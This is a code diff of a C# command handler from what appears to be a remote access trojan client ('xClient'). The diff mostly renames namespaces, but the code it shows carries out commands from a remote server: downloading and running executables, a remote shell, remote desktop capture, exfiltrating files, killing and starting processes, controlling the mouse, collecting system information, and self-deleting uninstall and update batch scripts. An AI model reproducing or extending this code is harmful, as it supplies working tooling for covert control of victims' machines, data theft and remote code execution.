@@ -1,7 +1,4 @@
-﻿using Client;
-using Core.RemoteShell;
-using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
@@ -9,8 +6,11 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
+using Microsoft.Win32;
+using xClient.Config;
+using xClient.Core.RemoteShell;
 
-namespace Core.Commands
+namespace xClient.Core.Commands
 {
 	public class CommandHandler
 	{
@@ -30,19 +30,19 @@ namespace Core.Commands
 		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
 		private const int MOUSEEVENTF_RIGHTUP = 0x10;
 
-		public static void HandleInitializeCommand(Core.Packets.ServerPackets.InitializeCommand command, Core.Client client)
+		public static void HandleInitializeCommand(global::xClient.Core.Packets.ServerPackets.InitializeCommand command, global::xClient.Core.Client client)
 		{
 			SystemCore.InitializeGeoIp();
-			new Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType, SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex).Execute(client);
 		}
 
-		public static void HandleDownloadAndExecuteCommand(Core.Packets.ServerPackets.DownloadAndExecute command, Core.Client client)
+		public static void HandleDownloadAndExecuteCommand(global::xClient.Core.Packets.ServerPackets.DownloadAndExecute command, global::xClient.Core.Client client)
 		{
-			new Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
 			new Thread(new ThreadStart(() =>
 			{
-				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".exe"));
+				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));
 
 				try
 				{
@@ -54,11 +54,11 @@ namespace Core.Commands
 				}
 				catch
 				{
-					new Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
+					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
 					return;
 				}
 
-				new Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
 
 				try
 				{
@@ -81,15 +81,15 @@ namespace Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
 					return;
 				}
 
-				new Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
 			})).Start();
 		}
 
-		public static void HandleUploadAndExecute(Core.Packets.ServerPackets.UploadAndExecute command, Core.Client client)
+		public static void HandleUploadAndExecute(global::xClient.Core.Packets.ServerPackets.UploadAndExecute command, global::xClient.Core.Client client)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -118,17 +118,17 @@ namespace Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
+					new global::xClient.Core.Packets.ClientPackets.Status("Execution failed!").Execute(client);
 					return;
 				}
 
-				new Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Executed File!").Execute(client);
 			})).Start();
 		}
 
-		public static void HandleUninstall(Core.Packets.ServerPackets.Uninstall command, Core.Client client)
+		public static void HandleUninstall(global::xClient.Core.Packets.ServerPackets.Uninstall command, global::xClient.Core.Client client)
 		{
-			new Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
 
 			if (Settings.STARTUP)
 			{
@@ -170,7 +170,7 @@ namespace Core.Commands
 				}
 			}
 
-			string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".bat"));
+			string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
 			
 			string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ? 
 					"@echo off" + "\n" +
@@ -198,29 +198,29 @@ namespace Core.Commands
 			client.Disconnect();
 		}
 
-		public static void HandleRemoteDesktop(Core.Packets.ServerPackets.Desktop command, Core.Client client)
+		public static void HandleRemoteDesktop(global::xClient.Core.Packets.ServerPackets.Desktop command, global::xClient.Core.Client client)
 		{
 			if (lastDesktopScreenshot == null)
 			{
-				lastDesktopScreenshot = Helper.GetDesktop(command.Mode, command.Number);
+				lastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
 
-				byte[] desktop = Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
+				byte[] desktop = Helper.Helper.CImgToByte(lastDesktopScreenshot, System.Drawing.Imaging.ImageFormat.Jpeg);
 
-				new Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 
 				desktop = null;
 			}
 			else
 			{
-				Bitmap currentDesktopScreenshot = Helper.GetDesktop(command.Mode, command.Number);
+				Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
 
-				Bitmap changesScreenshot = Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot);
+				Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(lastDesktopScreenshot, currentDesktopScreenshot);
 
 				lastDesktopScreenshot = currentDesktopScreenshot;
 
-				byte[] desktop = Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
+				byte[] desktop = Helper.Helper.CImgToByte(changesScreenshot, System.Drawing.Imaging.ImageFormat.Png);
 
-				new Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 
 				desktop = null;
 				changesScreenshot = null;
@@ -228,7 +228,7 @@ namespace Core.Commands
 			}
 		}
 
-		public static void HandleGetProcesses(Core.Packets.ServerPackets.GetProcesses command, Core.Client client)
+		public static void HandleGetProcesses(global::xClient.Core.Packets.ServerPackets.GetProcesses command, global::xClient.Core.Client client)
 		{
 			Process[] pList = Process.GetProcesses();
 			string[] processes = new string[pList.Length];
@@ -244,10 +244,10 @@ namespace Core.Commands
 				i++;
 			}
 
-			new Core.Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
 		}
 
-		public static void HandleKillProcess(Core.Packets.ServerPackets.KillProcess command, Core.Client client)
+		public static void HandleKillProcess(global::xClient.Core.Packets.ServerPackets.KillProcess command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -256,25 +256,25 @@ namespace Core.Commands
 			catch
 			{ }
 
-			HandleGetProcesses(new Core.Packets.ServerPackets.GetProcesses(), client);
+			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
 		}
 
-		public static void HandleStartProcess(Core.Packets.ServerPackets.StartProcess command, Core.Client client)
+		public static void HandleStartProcess(global::xClient.Core.Packets.ServerPackets.StartProcess command, global::xClient.Core.Client client)
 		{
 			ProcessStartInfo startInfo = new ProcessStartInfo();
 			startInfo.UseShellExecute = true;
 			startInfo.FileName = command.Processname;
 			Process.Start(startInfo);
 
-			HandleGetProcesses(new Core.Packets.ServerPackets.GetProcesses(), client);
+			HandleGetProcesses(new global::xClient.Core.Packets.ServerPackets.GetProcesses(), client);
 		}
 
-		public static void HandleDrives(Core.Packets.ServerPackets.Drives command, Core.Client client)
+		public static void HandleDrives(global::xClient.Core.Packets.ServerPackets.Drives command, global::xClient.Core.Client client)
 		{
-			new Core.Packets.ClientPackets.DrivesResponse(System.Environment.GetLogicalDrives()).Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.DrivesResponse(System.Environment.GetLogicalDrives()).Execute(client);
 		}
 
-		public static void HandleDirectory(Core.Packets.ServerPackets.Directory command, Core.Client client)
+		public static void HandleDirectory(global::xClient.Core.Packets.ServerPackets.Directory command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -309,26 +309,26 @@ namespace Core.Commands
 				if (folders.Length == 0)
 					folders = new string[] { "$$$EMPTY$$$$" };
 
-				new Core.Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
 			}
 			catch
 			{
-				new Core.Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
 			}
 		}
 
-		public static void HandleDownloadFile(Core.Packets.ServerPackets.DownloadFile command, Core.Client client)
+		public static void HandleDownloadFile(global::xClient.Core.Packets.ServerPackets.DownloadFile command, global::xClient.Core.Client client)
 		{
 			try
 			{
 				byte[] bytes = File.ReadAllBytes(command.RemotePath);
-				new Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.DownloadFileResponse(Path.GetFileName(command.RemotePath), bytes, command.ID).Execute(client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleMouseClick(Core.Packets.ServerPackets.MouseClick command, Core.Client client)
+		public static void HandleMouseClick(global::xClient.Core.Packets.ServerPackets.MouseClick command, global::xClient.Core.Client client)
 		{
 			if (command.LeftClick)
 			{
@@ -354,7 +354,7 @@ namespace Core.Commands
 			}
 		}
 
-		public static void HandleGetSystemInfo(Core.Packets.ServerPackets.GetSystemInfo command, Core.Client client)
+		public static void HandleGetSystemInfo(global::xClient.Core.Packets.ServerPackets.GetSystemInfo command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -381,13 +381,13 @@ namespace Core.Commands
 					SystemCore.GetFirewall()
 				};
 
-				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleVisitWebsite(Core.Packets.ServerPackets.VisitWebsite command, Core.Client client)
+		public static void HandleVisitWebsite(global::xClient.Core.Packets.ServerPackets.VisitWebsite command, global::xClient.Core.Client client)
 		{
 			string url = command.URL;
 
@@ -418,24 +418,24 @@ namespace Core.Commands
 					{ }
 				}
 
-				new Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Visited Website").Execute(client);
 			}
 		}
 
-		public static void HandleShowMessageBox(Core.Packets.ServerPackets.ShowMessageBox command, Core.Client client)
+		public static void HandleShowMessageBox(global::xClient.Core.Packets.ServerPackets.ShowMessageBox command, global::xClient.Core.Client client)
 		{
 			MessageBox.Show(null, command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon));
-			new Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.Status("Showed Messagebox").Execute(client);
 		}
 
-		public static void HandleUpdate(Core.Packets.ServerPackets.Update command, Core.Client client)
+		public static void HandleUpdate(global::xClient.Core.Packets.ServerPackets.Update command, global::xClient.Core.Client client)
 		{
 			// i dont like this updating... if anyone has a better idea feel free to edit it
-			new Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
 			new Thread(new ThreadStart(() =>
 			{
-				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".exe"));
+				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".exe"));
 
 				try
 				{
@@ -447,13 +447,13 @@ namespace Core.Commands
 				}
 				catch
 				{
-					new Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
+					new global::xClient.Core.Packets.ClientPackets.Status("Download failed!").Execute(client);
 					return;
 				}
 
-				new Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Downloaded File!").Execute(client);
 
-				new Core.Packets.ClientPackets.Status("Updating...").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Updating...").Execute(client);
 
 				try
 				{
@@ -463,7 +463,7 @@ namespace Core.Commands
 					if (bytes[0] != 'M' && bytes[1] != 'Z')
 						throw new Exception("no pe file");
 
-					string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.GetRandomFilename(12, ".bat"));
+					string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Helper.Helper.GetRandomFilename(12, ".bat"));
 
 					string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE) ?
 							"@echo off" + "\n" +
@@ -497,18 +497,18 @@ namespace Core.Commands
 				catch
 				{
 					DeleteFile(tempFile);
-					new Core.Packets.ClientPackets.Status("Update failed!").Execute(client);
+					new global::xClient.Core.Packets.ClientPackets.Status("Update failed!").Execute(client);
 					return;
 				}
 			})).Start();
 		}
 
-		public static void HandleMonitors(Core.Packets.ServerPackets.Monitors command, Core.Client client)
+		public static void HandleMonitors(global::xClient.Core.Packets.ServerPackets.Monitors command, global::xClient.Core.Client client)
 		{
-			new Core.Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
+			new global::xClient.Core.Packets.ClientPackets.MonitorsResponse(Screen.AllScreens.Length).Execute(client);
 		}
 
-		public static void HandleShellCommand(Core.Packets.ServerPackets.ShellCommand command, Core.Client client)
+		public static void HandleShellCommand(global::xClient.Core.Packets.ServerPackets.ShellCommand command, global::xClient.Core.Client client)
 		{
 			if (shell == null)
 				shell = new Shell();
@@ -530,7 +530,7 @@ namespace Core.Commands
 			}
 		}
 
-		public static void HandleRename(Core.Packets.ServerPackets.Rename command, Core.Client client)
+		public static void HandleRename(global::xClient.Core.Packets.ServerPackets.Rename command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -539,13 +539,13 @@ namespace Core.Commands
 				else
 					File.Move(command.Path, command.NewPath);
 
-				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
+				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.NewPath)), client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleDelete(Core.Packets.ServerPackets.Delete command, Core.Client client)
+		public static void HandleDelete(global::xClient.Core.Packets.ServerPackets.Delete command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -554,13 +554,13 @@ namespace Core.Commands
 				else
 					File.Delete(command.Path);
 
-				HandleDirectory(new Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
+				HandleDirectory(new global::xClient.Core.Packets.ServerPackets.Directory(Path.GetDirectoryName(command.Path)), client);
 			}
 			catch
 			{ }
 		}
 
-		public static void HandleAction(Core.Packets.ServerPackets.Action command, Core.Client client)
+		public static void HandleAction(global::xClient.Core.Packets.ServerPackets.Action command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -590,11 +590,11 @@ namespace Core.Commands
 			}
 			catch
 			{
-				new Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
 			}
 		}
 
-		public static void HandleGetStartup(object command, Core.Client client)
+		public static void HandleGetStartup(object command, global::xClient.Core.Client client)
 		{
 			try
 			{
@@ -636,7 +636,7 @@ namespace Core.Commands
 			}
 			catch
 			{
-				new Core.Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
+				new global::xClient.Core.Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
 			}
 		}
 	}
